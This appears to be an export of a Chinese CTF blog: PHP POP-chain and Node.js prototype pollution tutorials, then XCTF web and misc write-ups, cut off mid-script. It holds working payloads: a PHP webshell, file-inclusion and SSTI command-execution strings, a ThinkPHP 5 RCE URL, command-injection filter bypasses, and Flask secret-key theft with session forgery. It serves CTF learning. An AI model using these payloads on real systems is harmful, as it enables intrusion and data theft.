eeee{ public $obj; public function __clone() { if(isset($this-\u0026gt;obj-\u0026gt;cmd)){ echo \u0026#34;success\u0026#34;; } } } if(isset($_POST[\u0026#39;pop\u0026#39;])){ unserialize($_POST[\u0026#39;pop\u0026#39;]); } 逐步拆解\n在此题中很明显有个关键语句：echo file_get_contents('/flag');\n所以我们最终目的便是要触发Sec类里的__invoke魔术方法即可获取flag\n先从入口正推pop链\npop链构造题中最常见的入口就是__destruct()，此函数在对象销毁时立刻触发（可以直接理解为new该对象时直接触发该方法），所以我们第一步便是创建一个变量实现Start类：\n1 $res = new Start(); 此时会触发__destruct()函数：\n1 2 3 4 public function __destruct() { echo \u0026#34;Welcome to NewStarCTF, \u0026#34;.$this-\u0026gt;name; }\t发现有对字符串进行操作，联想到__tostring方法，所以我们寻找含有该魔术方法的类即Sec类\n第二步：\n1 $res-\u0026gt;name = new Sec(); 1 2 3 4 5 public function __toString() { $this-\u0026gt;obj-\u0026gt;check($this-\u0026gt;var); return \u0026#34;CTFers\u0026#34;; } 这里调用check函数是不存在的，联想到__call函数，找到Easy这个类\n第三步:\n1 $res-\u0026gt;name-\u0026gt;obj = new Easy(); 1 2 3 4 public function __call($fun, $var) { $this-\u0026gt;cla = clone $var[0]; } 这里调用clone，会触发下面的__clone方法，所以用eeee这个类\n第四步:\n1 $res-\u0026gt;name-\u0026gt;var = new eeee(); 1 2 3 4 5 6 public function __clone() { if(isset($this-\u0026gt;obj-\u0026gt;cmd)){ echo \u0026#34;success\u0026#34;; } } 调用了isset函数，会触发上面的__isset方法，回到Start这个类\n第五步：\n1 $res-\u0026gt;name-\u0026gt;var-\u0026gt;obj = new Start(); 1 2 3 4 public function __isset($var) { ($this-\u0026gt;func)(); } 这里把func当函数调用会触发__invoke方法，回到Sec类\n最后一步：\n1 $res-\u0026gt;name-\u0026gt;var-\u0026gt;obj-\u0026gt;func = new Sec(); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php class Start{ public $name; public $func; } class Sec{ public $obj; public $var; } class Easy{ public $cla; } class eeee{ public $obj; } $res = new Start(); $res-\u0026gt;name = new Sec(); $res-\u0026gt;name-\u0026gt;obj = new Easy(); $res-\u0026gt;name-\u0026gt;var = new eeee(); $res-\u0026gt;name-\u0026gt;var-\u0026gt;obj = new Start(); $res-\u0026gt;name-\u0026gt;var-\u0026gt;obj-\u0026gt;func = new Sec(); echo serialize($res); 另一种exp(逆推) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php class Start{ public $name; public $func; } class Sec{ public $obj; public $var; } class Easy{ public $cla; } class eeee{ public $obj; } $a = new Sec(); $b = new Start(); $b-\u0026gt;func = $a; $c = new eeee(); $c-\u0026gt;obj = $b; $d = new Sec(); $e = new Easy(); $d-\u0026gt;obj = $e; $d-\u0026gt;var = $c; $f = new Start(); $f-\u0026gt;name = $d; echo serialize($f); ","date":"2025-02-07T00:00:00Z","image":"https://0d000721999.github.io/p/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0pop%E9%93%BE/1.png","permalink":"https://0d000721999.github.io/p/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0pop%E9%93%BE/","title":"PHP反序列化构造POP链"},{"content":"nodejs原型链污染攻击 参考p神的文章：深入理解 JavaScript Prototype 污染攻击 | 离别歌\n前置知识 原型链污染攻击也称JavaScript Prototype 污染攻击\njs数据类型 let和var关键字的区别 let和var的区别如下：\nvar是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined；var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 1 2 3 4 var x=5; var y=6; var z=x+y; var x,y,z=1; 1 let x=5; 数组变量 1 var a = new Array(); 1 var a = []; 字典 1 var a = {}; 1 var a = {\u0026#34;foo\u0026#34;:\u0026#34;bar\u0026#34;}; js函数 声明一个函数 1 2 3 function myFuntion() { } 1 2 3 function myFuntion(a) { } 1 2 3 function myFuntion(a) { return a; } 匿名函数 1 2 3 4 直接调用匿名函数 (function(a){ console.log(a); })(123); 1 2 3 4 还可以把变量变成函数，调用fn()即调用了匿名函数的功能 var fn = function(){ return \u0026#34;将匿名函数赋值给变量\u0026#34;; } 闭包 假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域或（封闭的盒子）就会删除，此时这个新建变量也会被删除。\n如何令这个封闭的盒子是不会删除？可以使用“闭包”的方法（闭包涉及函数作用域、内存回收机制、作用域继承）\n闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量\n例如不使用额外的全局变量，实现一个计数器\n因为add变量指定了函数自我调用的返回值(可以理解为计数器值保存在了add中), 每次调用值都加一而不是每次都是1\n1 2 3 4 var add = (function () { var counter = 0; return function () {return counter += 1;} })(); js类 在以前，如果要定义一个类，需要以定义“构造函数”的方式来定义，例如\n1 2 3 4 5 function newClass() { this.test = 1; } var newObj = new newClass(); 如果想添加一些方法呢？可以在内部使用构造方法\n1 2 3 4 5 6 7 8 9 function newClass() { this.test = 123; this.fn = function() { return this.test; } } var newObj = new newClass(); newObj.fn(); 为了简化编写JavaScript代码，ECMAScript 6后增加了class语法\nclass关键字 1 2 3 class ClassName { constructor() { ... } } 1 2 3 4 5 6 class myClass { //newClass的构造方法如下 constructor(a) { this.test = a;//含有一个test属性，值为构造时传入的参数 } } 创建对象\n1 let testClass = new myClass(\u0026#34;testtest\u0026#34;); 1 2 查看testClass对象的test属性的值，为testtest console.log(testClass.test); 添加属性\n1 testClass.aaa = 333; 原型链污染 原型 这里的原型指的是prototype\n比如说上面前言部分讲的JavaScript类那里，\n我们使用new新建了一个newClass对象给newObj变量\n1 2 3 4 5 function newClass() { this.test = 1; } var newObj = new newClass(); 实际上这个newObj变量使用了原型（prototype）来实现对象的绑定【而不是绑定在“类”中，与JavaScript的特性有关，它的“类”与其它语言(例如JAVA、C++)类不同，它的“类”基于原型】\nprototype是newClass类的一个属性，而所有用newClass类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法，如下\nprototype是newClass类的一个属性 newClass类实例化的对象newObj不能访问prototype，但可以通过.__proto__来访问newClass类的prototype newClass实例化的对象newObj的.__proto__指向newClass类的prototype 关系图\n污染原理 现在已经知道实例化的对象的.__proto__指向类的prototype，\n那么修改了实例化的对象的.__proto__的内容, 类的prototype的内容是否也会发生改变？\n答案是肯定的，这就是原型链污染的利用方法\ne.g. 1 2 3 4 5 6 7 8 创建一个类a function a() { this.test = 1; } 然后实例化一个对象obj var obj = new a(); 此时查看obj的内容 obj 修改a类的原型(object)\n1 2 3 4 5 6 添加一个属性test1，令其值为123 a.prototype.test1 = 123; 再次查看obj的内容，多了一个test1 obj 再次查看obj的内容，多了一个test1 obj.test1 1 2 3 4 5 6 7 8 再实例化一个a的对象 var obj1 = new a(); 访问obj.test1，发现也是123 然后尝试通过obj1的.__proto__属性来修改test1的值 obj1.__proto__.test1 = 124; 此时访问obj.test1，发现也被修改成了124 明明没有动obj，obj.test1却改变了,说明a类中的test1被修改了 obj.test1 1 2 3 4 通过obj1中.__proto__属性添加一个新属性，和上面修改a类的原型的过程也是一样的 下面演示添加新属性test2 obj1.__proto__.test2 = 111; 可以发现obj中也出现了新属性test2, 并且a类中也出现了新属性test2 进一步利用 1 2 3 4 5 6 先实例化一个字典对象，叫obj，内有key名为test，test的value是123 var obj = {\u0026#34;test\u0026#34;: 123}; 然后通过obj的.__proto__属性为test重新赋值 obj.__proto__.test = 2; 再实例化一个空字典对象，叫ooo var ooo = {}; 查看ooo的test属性是2\n因为Object类的test属性已经被污染，而对象ooo和obj同属Object类\n那再看看obj的test属性的值，为123\n查找顺序 p神的解释\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。 function Father() { this.first_name = \u0026#39;Donald\u0026#39; this.last_name = \u0026#39;Trump\u0026#39; } function Son() { this.first_name = \u0026#39;Melania\u0026#39; } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) Son类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。 总结一下，对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作： 1、在对象son中寻找last_name 2、如果找不到，则在son.__proto__中寻找last_name 3、如果仍然找不到，则继续在son.__proto__.__proto__中寻找last_name 4、依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null 比如说此处的obj\n利用.__proto__修改值后的test属性在当前对象的test属性下面（也就是在当前对象所绑定的prototype中），\n所以优先读取当前对象下的test属性，即未被修改的值123\n","date":"2025-01-11T00:00:00Z","image":"https://0d000721999.github.io/p/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/1.png","permalink":"https://0d000721999.github.io/p/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/","title":"nodejs原型链污染攻击"},{"content":"xctf刷题 心仪的公司（misc) 使用 linux strings 命令查看 对{进行匹配 strings webshell.pcapng | grep {\n得到flag\n或者\nwireshark过滤http contains \u0026ldquo;shell\u0026rdquo;\n查看过滤出来的包\n最后就是flag\n适合作为桌面（misc) stegsolve发现二维码扫出一串16进制\n丢进010，是pyc文件，后缀修改为.pyc\nEasy Python Decompiler对文件进行反编译。反编译后用vim查看源码\n一串函数没被调用，直接补上flag()\nback up(web) 备份文件查看的后缀\n1 “.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” 这题.bak下载文件用记事本打开看到flag\nsimple_php(web) php弱类型比较\na与0比较前会转成相同的数据类型所以a可以是任意字符串结果为0；\nb不能是数字但是要大于1234，我们直接把大于1234的数与任意字符串拼接\neasyupload（web） 这题尝试了很多办法\n最后用.user.ini的方式上传成功\n先上传.user.ini\n1 2 3 4 5 .user.ini 配置项中有两个配置可以起到一些作用 方法一： auto_prepend_file = \u0026lt;filename\u0026gt; //包含在文件头 方法二： auto_append_file = \u0026lt;filename\u0026gt; //包含在文件尾 文件名我们写shell.jpg\n然后bp改包\n注意要在这里\n文件头加上GIF89a才会上传成功\n然后就是shell.jpg里面的木马最稳定的是\n1 \u0026lt;?=eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; 上传成功后利用到特性user.ini和shell.jpg同一目录下的所有php文件都会包含shell.jpg文件\n蚁剑连接index.php，密码为cmd即可\nfileinclude(web) 查看源码\n大概意思就是在cookie的位置给language填值会传给变量lan让index.php包含上lan.php的东西\n由于源码中会加.php所以我们只传值为\n1 php://filter/read=convert.base64-encode/resource=/var/www/html/flag 然后放行就得到编码后的flag\nfileclude(web) file1很好利用跟上面一样base64编码flag.php文件\n1 ?file1=php://filter/read=convert.base64-encode/resource=flag.php file2要内容包含hello ctf\n第一种办法在data数据流中加入hello ctf\n1 file2=data://text/plain,hello ctf 第二种用php://input\n然后在post里面传hello ctf\nhackbar要传键值对的形式 hello ctf=hello ctf\n然后bp抓包把键删掉放行\nbase64解码出flag\neasyphp(web) 代码审计\nintval函数返回整型的值\n我们用科学计数法就绕过了1e9|1e8|1e7都行\n然后b跑脚本\n得出53724\n然后c是一个数组，最后要为json格式，c中m不是数字但要\u0026gt;2022,用前面学到的数字拼接字符串绕过2023a\nc中的n长度为2，且为二维数组，就是[[..],..]的形式\n要绕过的是array_search函数\nc[n]中必须有DGGJ,后面对数组值判断有DGGJ就终止\n上面跟字符串比较数字一样的原理\narray_search函数是弱比较，所以用0代替DGGJ\npayload\n1 ?a=1e9\u0026amp;b=53724\u0026amp;c={\u0026#34;m\u0026#34;:\u0026#34;2023c\u0026#34;,\u0026#34;n\u0026#34;:[[],0]} file_include(web) 文件包含\n尝试用转base64编码方法查看check.php\n但是试了一下发现都被过滤了\nphp://伪协议读文件的其他方式 convert.过滤器支持convert.iconv. 格式，使用方法：\nconvert.iconv.\u0026lt;input-encoding\u0026gt;.\u0026lt;output-encoding\u0026gt; 或 convert.iconv.\u0026lt;input-encoding\u0026gt;/\u0026lt;output-encoding\u0026gt; 例如：\nconvert.iconv.UCS-4*.UCS-4BE \u0026mdash;\u0026gt; 将指定的文件从UCS-4*转换为UCS-4BE 输出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 php支持的编码格式(部分) UCS-4* UCS-4BE UCS-4LE* UCS-2 UCS-2BE UCS-2LE UTF-32* UTF-32BE* UTF-32LE* UTF-16* UTF-16BE* UTF-16LE* UTF-7 UTF7-IMAP UTF-8* ASCII* EUC-JP* SJIS* eucJP-win* SJIS-win* ISO-2022-JP ISO-2022-JP-MS CP932 CP51932 SJIS-mac（别名：MacJapanese） SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO） SJIS-Mobile#KDDI（别名：SJIS-KDDI） SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK） UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO） UTF-8-Mobile#KDDI-A UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI） UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK） ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI） payload\n1 ?filename=php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php unseping(web) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 \u0026lt;?php highlight_file(__FILE__); class ease{ private $method; private $args; function __construct($method, $args) { $this-\u0026gt;method = $method; $this-\u0026gt;args = $args; } function __destruct(){ if (in_array($this-\u0026gt;method, array(\u0026#34;ping\u0026#34;))) { call_user_func_array(array($this, $this-\u0026gt;method), $this-\u0026gt;args); } } function ping($ip){ exec($ip, $result); var_dump($result); } function waf($str){ if (!preg_match_all(\u0026#34;/(\\||\u0026amp;|;| |\\/|cat|flag|tac|php|ls)/\u0026#34;, $str, $pat_array)) { return $str; } else { echo \u0026#34;don\u0026#39;t hack\u0026#34;; } } function __wakeup(){ foreach($this-\u0026gt;args as $k =\u0026gt; $v) { $this-\u0026gt;args[$k] = $this-\u0026gt;waf($v); } } } $ctf=@$_POST[\u0026#39;ctf\u0026#39;]; @unserialize(base64_decode($ctf)); ?\u0026gt; 反序列化漏洞\ndestruct函数会在反序列化函数调用时被调用，要求第一个参数含ping，第二个参数由于call_user_func_array函数所以要为数组array()\n现在考虑在array中填命令让他执行\n注意构造时引号的细节，单引号会把中间的内容完全视为字符串，但双引号会把内部变量进行解析，若在输入array的参数时用双引号，会对${}中的内容进行解析导致payload构造失败。\nls被过滤我们用l\u0026quot;\u0026ldquo;s绕过,或者反斜线绕过l\\s\n目录下有flag_1s_here文件夹，flag可以用f\u0026quot;\u0026ldquo;lag绕过也可以f***\n1 l\u0026#34;\u0026#34;s${IFS}f\u0026#34;\u0026#34;lag_1s_here 目录下有flag_831b69012c67b35f.php文件\ncat同样可以用c\u0026quot;\u0026ldquo;at绕过,php用p\u0026quot;\u0026ldquo;hp绕过,或者整个用f*代替，/要用要用printf及$()绕过\n/-\u0026gt;$(printf${IFS}\u0026quot;\\57\u0026rdquo;)\n1 c\u0026#34;\u0026#34;at${IFS}f\u0026#34;\u0026#34;lag_1s_here$(printf${IFS}\u0026#34;\\57\u0026#34;)f\u0026#34;\u0026#34;lag_831b69012c67b35f.p\u0026#34;\u0026#34;hp 或者直接整个用print和$()绕过\n1 $(printf${IFS}\u0026#34;\\143\\141\\164\\40\\146\\154\\141\\147\\137\\61\\163\\137\\150\\145\\162\\145\\57\\146\\154\\141\\147\\137\\70\\63\\61\\142\\66\\71\\60\\61\\62\\143\\66\\67\\142\\63\\65\\146\\56\\160\\150\\160(cat flag_1s_here/flag_831b69012c67b35f.php的八进制或十六进制编码都可以)\u0026#34;) Web_python_template_injection(web) SSTI 1 2 3 4 5 6 7 __class__ 返回类型所属的对象 __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 __init__ 类的初始化方法 __globals__ 对包含函数全局变量的字典的引用 常见payload\n1 {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()}} 脚本查找os\n1 2 3 4 5 6 7 8 import requests from tqdm import tqdm for i in tqdm(range(233)): url=\u0026#39;ip/?name={{\u0026#34;\u0026#34;.__class__.__base__.__subclasses__()[\u0026#39;+str(i)+\u0026#39;]}}\u0026#39; r=request.get(url=url).text if(\u0026#39;os._wrap_close\u0026#39; in r): print(i) 1 2 3 4 5 6 7 查找危险函数 例如eval 拼接键值 [\u0026#34;__builtins__\u0026#34;][\u0026#39;eval\u0026#39;] 执行命令 (\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;id\u0026#34;).read()\u0026#39;) 在popen中来执行命令 这题先\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()}} 有一个typefile类型,用于文件读取（位置在40）\n1 {{ [].__class__.__base__.__subclasses__()[40](\u0026#39;/etc/passwd\u0026#39;).read() }} 还有一个\u0026lt;class \u0026lsquo;site._printer\u0026rsquo;\u0026gt;类型（位置在71），用于命令执行\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\u0026#39;os\u0026#39;].listdir(\u0026#39;.\u0026#39;)}} 发现f14g\n用文件读取命令\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[40](\u0026#39;fl4g\u0026#39;).read()}} 官方WP 1 2 3 4 5 6 7 8 先查看所有模块 {{[].__class__.__base__.__subclasses__()}} os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置（59） 查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中 {{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}} 使用[\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;],可绕过对os字符的过滤 {{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;)}}查找到flag {{\u0026#34;\u0026#34;.__class__.__mro__[2].__subclasses__()[40](\u0026#34;fl4g\u0026#34;).read()}} Web_php_unserialize(web) 首先得绕过正则匹配\n1 2 3 4 5 6 7 /i 表示匹配的时候不区分大小写 \\d 匹配一个数字字符。等价于 [0-9]。 “+” 出现至少1次 [ ] 是定义匹配的字符范围 [oc]是匹配o或c任意一个 [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 \\d+是为了匹配[0-9]的数字，多次匹配！ 就是想过滤o:4,我们用o:+4绕过\nwakeup成员数加一就行\n脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php class Demo { private $file = \u0026#39;index.php\u0026#39;; public function __construct($file) { $this-\u0026gt;file = $file; } function __destruct() { echo @highlight_file($this-\u0026gt;file, true); } function __wakeup() { if ($this-\u0026gt;file != \u0026#39;index.php\u0026#39;) { //the secret is in the fl4g.php $this-\u0026gt;file = \u0026#39;index.php\u0026#39;; } } } $a = new Demo(\u0026#39;fl4g.php\u0026#39;); $str=serialize($a); //echo $a; $str1 = str_replace(\u0026#39;O:4\u0026#39;, \u0026#39;O:+4\u0026#39;,$str);//绕过preg_match $str2 = str_replace(\u0026#39;:1:\u0026#39;, \u0026#39;:2:\u0026#39;,$str1);//绕过wakeup var_dump($str2);//string(49) \u0026#34;O:+4:\u0026#34;Demo\u0026#34;:2:{s:10:\u0026#34;Demofile\u0026#34;;s:8:\u0026#34;fl4g.php\u0026#34;;}\u0026#34; var_dump(base64_encode($str2)); ?\u0026gt; 给var传base64码就行了\nphp_rce 进去发现是thinkphp5框架，去github上找\n多试试payload\n1 2 6、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=id 7、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=phpinfo\u0026amp;vars[1][]=1 在[]后输命令就行\nls没发现flag\nfind / -name \u0026ldquo;flag*\u0026rdquo;\n找到flag\n或者一直跳目录\nWeb_php_include 过滤php://\n用大写绕过PHP://\npost传一句话\n用data://协议\n1 2 3 4 5 6 7 8 9 使用方法data://text/plain;base64;base64编码后的命令 \u0026lt;?php system(\u0026#34;dir\u0026#34;)?\u0026gt; base64编码后使用 http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b (注意编码后的+号要URL编码) \u0026lt;?php system(\u0026#34;cat fl4gisisish3r3.php\u0026#34;)?\u0026gt; base64编码后使用 http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg== 或者传一句话木马连接 catcat-new 前置知识\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /etc/passwd 该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为 用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符） /proc/self proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。 /proc/self/cmdline 该文件包含的内容为当前进程执行的命令行参数。 /proc/self/mem /proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。 /proc/self/maps /proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。 flask-session结构 flask_session是flask框架实现session功能的一个插件。其session结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session默认session的储存是在用户Cookie中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。 这题访问网页，看到上面有?file=，想到文件包含\n尝试访问etc/passwd，跳了多级目录发现确实访问到了\n读取当前进程的命令行参数?file=../../../../proc/self/cmdline，发现有一个通过python启动app.py的命令\n有app.py判断这题是flask框架\n读取app.py\n转换格式\n1 2 3 4 5 6 7 8 9 10 11 # 需要格式化的代码 code_str = \u0026#39;\u0026#39;\u0026#39;import os\\nimport uuid\\nfrom flask import Flask, request, session, render_template, Markup\\nfrom cat import cat\\n\\nflag = \u0026#34;\u0026#34;\\napp = Flask(\\n __name__,\\n static_url_path=\\\u0026#39;/\\\u0026#39;, \\n static_folder=\\\u0026#39;static\\\u0026#39; \\n)\\napp.config[\\\u0026#39;SECRET_KEY\\\u0026#39;] = str(uuid.uuid4()).replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) + \u0026#34;*abcdefgh\u0026#34;\\nif os.path.isfile(\u0026#34;/flag\u0026#34;):\\n flag = cat(\u0026#34;/flag\u0026#34;)\\n os.remove(\u0026#34;/flag\u0026#34;)\\n\\n@app.route(\\\u0026#39;/\\\u0026#39;, methods=[\\\u0026#39;GET\\\u0026#39;])\\ndef index():\\n detailtxt = os.listdir(\\\u0026#39;./details/\\\u0026#39;)\\n cats_list = []\\n for i in detailtxt:\\n cats_list.append(i[:i.index(\\\u0026#39;.\\\u0026#39;)])\\n\\n return render_template(\u0026#34;index.html\u0026#34;, cats_list=cats_list, cat=cat)\\n\\n\\n\\n@app.route(\\\u0026#39;/info\\\u0026#39;, methods=[\u0026#34;GET\u0026#34;, \\\u0026#39;POST\\\u0026#39;])\\ndef info():\\n filename = \u0026#34;./details/\u0026#34; + request.args.get(\\\u0026#39;file\\\u0026#39;, \u0026#34;\u0026#34;)\\n start = request.args.get(\\\u0026#39;start\\\u0026#39;, \u0026#34;0\u0026#34;)\\n end = request.args.get(\\\u0026#39;end\\\u0026#39;, \u0026#34;0\u0026#34;)\\n name = request.args.get(\\\u0026#39;file\\\u0026#39;, \u0026#34;\u0026#34;)[:request.args.get(\\\u0026#39;file\\\u0026#39;, \u0026#34;\u0026#34;).index(\\\u0026#39;.\\\u0026#39;)]\\n\\n return render_template(\u0026#34;detail.html\u0026#34;, catname=name, info=cat(filename, start, end))\\n\\n\\n\\n@app.route(\\\u0026#39;/admin\\\u0026#39;, methods=[\u0026#34;GET\u0026#34;])\\ndef admin_can_list_root():\\n if session.get(\\\u0026#39;admin\\\u0026#39;) == 1:\\n return flag\\n else:\\n session[\\\u0026#39;admin\\\u0026#39;] = 0\\n return \u0026#34;NoNoNo\u0026#34;\\n\\n\\n\\nif __name__ == \\\u0026#39;__main__\\\u0026#39;:\\n app.run(host=\\\u0026#39;0.0.0.0\\\u0026#39;, debug=False, port=5637)\u0026#39;\u0026#39;\u0026#39; # 按行分割字符串 lines = code_str.split(\u0026#39;\\n\u0026#39;) indented_lines = [line if line.strip() else \u0026#39;\u0026#39; for line in lines] # 连接并打印格式化后的代码 formatted_code = \u0026#39;\\n\u0026#39;.join(indented_lines) print(formatted_code) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import os import uuid from flask import Flask, request, session, render_template, Markup from cat import cat flag = \u0026#34;\u0026#34; app = Flask( __name__, static_url_path=\u0026#39;/\u0026#39;, static_folder=\u0026#39;static\u0026#39; ) app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(uuid.uuid4()).replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) + \u0026#34;*abcdefgh\u0026#34; if os.path.isfile(\u0026#34;/flag\u0026#34;): flag = cat(\u0026#34;/flag\u0026#34;) os.remove(\u0026#34;/flag\u0026#34;) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def index(): detailtxt = os.listdir(\u0026#39;./details/\u0026#39;) cats_list = [] for i in detailtxt: cats_list.append(i[:i.index(\u0026#39;.\u0026#39;)]) return render_template(\u0026#34;index.html\u0026#34;, cats_list=cats_list, cat=cat) @app.route(\u0026#39;/info\u0026#39;, methods=[\u0026#34;GET\u0026#34;, \u0026#39;POST\u0026#39;]) def info(): filename = \u0026#34;./details/\u0026#34; + request.args.get(\u0026#39;file\u0026#39;, \u0026#34;\u0026#34;) start = request.args.get(\u0026#39;start\u0026#39;, \u0026#34;0\u0026#34;) end = request.args.get(\u0026#39;end\u0026#39;, \u0026#34;0\u0026#34;) name = request.args.get(\u0026#39;file\u0026#39;, \u0026#34;\u0026#34;)[:request.args.get(\u0026#39;file\u0026#39;, \u0026#34;\u0026#34;).index(\u0026#39;.\u0026#39;)] return render_template(\u0026#34;detail.html\u0026#34;, catname=name, info=cat(filename, start, end)) @app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#34;GET\u0026#34;]) def admin_can_list_root(): if session.get(\u0026#39;admin\u0026#39;) == 1: return flag else: session[\u0026#39;admin\u0026#39;] = 0 return \u0026#34;NoNoNo\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=False, port=5637) 要session中admin=1的用户才能访问/admin才能拿到flag\nsession的伪造需要secret_key,而secret_key的值可以通过内存数据获取。先读取/proc/self/maps文件获取可读内容的内存映射地址。\n用脚本找出secret_key\n第一种直接访问url来查找\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 # coding=utf-8 #---------------------------------- ################################### #Edited by lx56@blog.lxscloud.top ################################### #---------------------------------- import requests import re import ast, sys from abc import ABC from flask.sessions import SecureCookieSessionInterface url = \u0026#34;http://61.147.171.105:52969/\u0026#34; #此程序只能运行于Python3以上 if sys.version_info[0] \u0026lt; 3: # \u0026lt; 3.0 raise Exception(\u0026#39;Must be using at least Python 3\u0026#39;) #----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ---------------- class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_key class FSCM(ABC): def encode(secret_key, session_cookie_structure): #Encode a Flask session cookie try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \u0026#34;[Encoding error] {}\u0026#34;.format(e) raise e #由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key s_key = \u0026#34;\u0026#34; bypass = \u0026#34;../..\u0026#34; #请求file路由进行读取 map_list = requests.get(url + f\u0026#34;info?file={bypass}/proc/self/maps\u0026#34;) map_list = map_list.text.split(\u0026#34;\\\\n\u0026#34;) for i in map_list: #匹配指定格式的地址 map_addr = re.match(r\u0026#34;([a-z0-9]+)-([a-z0-9]+) 